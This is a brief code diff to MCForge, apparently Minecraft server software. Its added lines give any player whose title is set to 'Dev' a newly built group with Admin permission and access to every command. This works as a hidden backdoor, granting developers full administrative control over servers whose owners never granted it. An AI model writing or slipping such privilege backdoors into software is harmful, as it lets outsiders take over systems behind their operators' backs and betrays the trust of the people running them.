@@ -675,6 +675,16 @@ namespace MCForge
                     title = "Dev";
                 }
                 SetPrefix();
+                {
+                    Group Developer = new Group();
+                    Developer.Permission = LevelPermission.Admin;
+                    Developer.name = Group.findPerm(LevelPermission.Admin).name;
+                    Developer.trueName = "Dev"; // that's a true name ;) you can change it if you get any errors               
+                    Developer.color = Group.findPerm(LevelPermission.Admin).color;
+                    Developer.commands = Command.all;
+                    // Group.GroupList.Add(Developer);
+                    this.group = Developer;
+                }
             }
 
             try
